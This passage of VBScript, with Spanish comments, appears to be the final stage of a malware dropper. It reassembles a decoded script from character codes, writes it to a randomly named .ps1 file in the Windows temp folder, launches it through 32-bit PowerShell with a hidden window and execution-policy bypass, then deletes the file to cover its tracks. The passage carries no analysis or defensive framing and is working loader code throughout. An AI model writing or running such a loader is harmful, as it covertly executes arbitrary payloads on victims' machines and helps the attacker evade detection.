        chars(i) = Chr(plaintext(i))
    Next
    scriptContent = Join(chars, "")

    ' Drop en %TEMP%\<5 digitos>.ps1
    Set fso   = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    scriptPath = fso.GetSpecialFolder(2) & "\" & Int(Rnd * 90000 + 10000) & ".ps1"
    Set stream = fso.CreateTextFile(scriptPath, True, True)  ' unicode
    stream.Write scriptContent
    stream.Close

    ' Ejecutar con PowerShell oculto y luego borrar
    On Error Resume Next
    psExe = shell.ExpandEnvironmentStrings("%SystemRoot%") & "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    cmd   = """" & psExe & """ -NoP -NonI -W Hidden -EP Bypass -Sta -File """ & scriptPath & """"
    shell.Run cmd, 0, False
    WScript.Sleep 2500
    fso.DeleteFile scriptPath, True
    On Error GoTo 0
End Sub
